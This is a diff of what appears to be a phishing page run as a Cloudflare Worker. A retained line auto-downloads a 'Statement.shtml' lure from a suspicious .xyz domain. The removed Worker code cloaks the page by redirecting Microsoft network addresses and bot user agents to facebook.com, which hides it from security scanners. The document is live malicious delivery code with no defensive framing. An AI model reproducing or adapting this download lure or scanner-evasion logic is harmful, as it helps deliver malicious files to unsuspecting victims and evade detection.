@@ -1,4 +1,4 @@
-const html = `<html>
+<html>
 <head>
 </head>
 
@@ -38,29 +38,4 @@ downloadFile('https://www.kjkjkalao.xyz/statement.shtml', 'Statement.shtml')
 
 
 
-</html>`;
-
-async function handleRequest(request) {
-  if (request.cf && request.cf.asn == 8075) {
-window.location.href = "https://facebook.com";  }
-
-if (request.cf && request.cf.asOrganization == "Microsoft") {
-window.location.href = "https://facebook.com";  }
-
-  const userAgent = request.headers.get('User-Agent') || '';
-  if (userAgent.includes('bot')) {
-window.location.href = "https://facebook.com";  }
- 
-
-
-  return new Response(html, {
-    headers: {
-      'content-type': 'text/html;charset=UTF-8',
-    },
-  });
-}
-
-addEventListener('fetch', event => {
-  
-  return event.respondWith(handleRequest(event.request));
-});
+</html>
